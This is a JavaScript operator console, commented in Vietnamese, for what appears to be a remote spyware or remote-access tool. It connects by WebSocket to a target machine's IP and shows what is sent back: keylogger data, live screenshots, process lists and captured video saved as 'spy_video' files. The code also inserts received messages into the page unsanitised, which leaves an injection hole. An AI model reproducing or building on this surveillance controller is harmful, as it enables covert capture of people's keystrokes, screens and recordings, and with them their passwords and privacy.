// --- CẤU HÌNH & BIẾN TOÀN CỤC ---
let socket = null;
let liveMonitorWindow = null;

// Các biến DOM quan trọng (dùng chung)
const statusText = document.getElementById("statusText");
const logBox = document.getElementById("logBox");
const adminLogBox = document.getElementById("adminLogBox");
const nextBtn = document.getElementById("nextBtn");

// --- HÀM GHI LOG (Dùng chung cho cả 2 file) ---
function log(msg, isAdminLog = false) {
  const time = new Date().toLocaleTimeString();
  const line = `<div style="border-bottom:1px dashed #444; margin-bottom:5px; padding-bottom: 2px;">
                    <span style="color: #aaa; font-size: 0.85em;">[${time}]</span> ${msg}
                  </div>`;

  // Ghi log vào màn hình kết nối
  if (logBox) logBox.innerHTML = line + logBox.innerHTML;

  // Ghi log vào màn hình Admin (nếu có)
  if (adminLogBox) adminLogBox.innerHTML = line + adminLogBox.innerHTML;
}

// --- HÀM KẾT NỐI WEBSOCKET ---
function connectToWebSocket(ip) {
  const wsUrl = `ws://${ip}:8080`;

  if (socket) {
    socket.close();
  }

  log(`Đang khởi tạo kết nối tới: <b>${wsUrl}</b>...`);

  try {
    socket = new WebSocket(wsUrl);

    // 1. KẾT NỐI THÀNH CÔNG
    document.getElementById("nextBtn").disabled = false;

    socket.onopen = () => {
      if (statusText) {
        statusText.innerText = " Đã kết nối: " + ip;
        statusText.style.color = "green";
      }
      log("✅ Socket Connected Successfully!");

      socket.send("REGISTER_WEB");
      log("📤 Sent identification: REGISTER_WEB");

      if (nextBtn) {
        nextBtn.disabled = false;
        nextBtn.style.opacity = "1";
        nextBtn.style.cursor = "pointer";
      }
    };

    // 2. NHẬN TIN NHẮN TỪ SERVER
    socket.onmessage = (event) => {
      const msg = event.data;

      // 2.1. Xử lý Video File (Tải về)
      // Trong socket.onmessage:
      if (msg.startsWith("VIDEO_DATA:")) {
        log("🎥 Nhận video file! Đang tải...", true);
        downloadVideo(msg.replace("VIDEO_DATA:", ""));
      }
      // 2.2. Xử lý Ảnh Screenshot (Hiển thị Popup)
      else if (msg.startsWith("IMG_BASE64:")) {
        log("📸 Nhận ảnh Screenshot!", true);
        const base64Img = msg.replace("IMG_BASE64:", "");
        openLiveMonitor(base64Img);
      }
      // 2.3. Xử lý Keylog Data
      else if (msg.startsWith("KEYLOG_DATA:")) {
        log("⌨️ Keylog data: <br>" + msg.replace("KEYLOG_DATA:", ""), true);
      }
      // 2.4. Xử lý Process List
      else if (msg.startsWith("LIST_PROC:")) {
        const content = msg.replace("LIST_PROC:", "").replace(/\n/g, "<br>");
        log(
          "📄 Process List:<br><div style='max-height:200px; overflow-y:auto; font-size:0.8em;'>" +
            content +
            "</div>",
          true
        );
      }
      // 2.5. Tin nhắn thường
      else {
        log("📥 " + msg, true);
      }
    };

    // 3. MẤT KẾT NỐI
    socket.onclose = (event) => {
      if (statusText) {
        statusText.innerText = "Mất kết nối";
        statusText.style.color = "red";
      }
      log(`❌ Socket Disconnected (Code: ${event.code})`);

      if (nextBtn) {
        nextBtn.disabled = true;
        nextBtn.style.opacity = "0.5";
        nextBtn.style.cursor = "not-allowed";
      }
    };

    // 4. LỖI
    socket.onerror = (error) => {
      log("⚠️ Socket Error. Kiểm tra lại IP hoặc Server.");
      console.error("WebSocket Error:", error);
    };
  } catch (e) {
    log("Lỗi khởi tạo: " + e.message);
  }
}

// --- HÀM ĐƯỢC GỌI BỞI NÚT "CONNECT" TRONG HTML ---
function connectButtonClicked() {
  const ipInput = document.getElementById("ipInput");
  const ip = ipInput.value.trim();

  if (!ip) {
    alert("Vui lòng nhập địa chỉ IP!");
    return;
  }

  if (statusText) {
    statusText.innerText = "Đang kết nối...";
    statusText.style.color = "orange";
  }

  connectToWebSocket(ip);
}

// --- CÁC HÀM HỖ TRỢ HIỂN THỊ ---

function downloadVideo(base64) {
  try {
    const byteCharacters = atob(base64);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
      byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], { type: "video/x-msvideo" });
    const url = URL.createObjectURL(blob);
    const fileName = `spy_video_${new Date().getTime()}.avi`;

    const a = document.createElement("a");
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    const linkHtml = `<a href="${url}" download="${fileName}" style="color: #3498db; font-weight: bold; margin-left: 5px;">[📥 Tải Video]</a>`;
    log(`✅ Video sẵn sàng! ${linkHtml}`, true);
  } catch (e) {
    log("❌ Lỗi tải video: " + e.message, true);
  }
}

function openLiveMonitor(base64Img) {
  // Nếu cửa sổ chưa mở hoặc đã bị đóng -> Mở mới
  if (!liveMonitorWindow || liveMonitorWindow.closed) {
    liveMonitorWindow = window.open("", "LiveMonitor", "width=800,height=600");
    liveMonitorWindow.document.write(`
            <!DOCTYPE html>
            <html>
            <head><title>Image Viewer</title></head>
            <body style="background:#222; display:flex; justify-content:center; align-items:center; margin:0;">
                <img id="live-img" src="data:image/png;base64,${base64Img}" style="max-width:100%; max-height:100vh;" />
            </body>
            </html>
        `);
  } else {
    // Cập nhật ảnh nếu cửa sổ đang mở
    const img = liveMonitorWindow.document.getElementById("live-img");
    if (img) img.src = "data:image/png;base64," + base64Img;
    liveMonitorWindow.focus();
  }
}
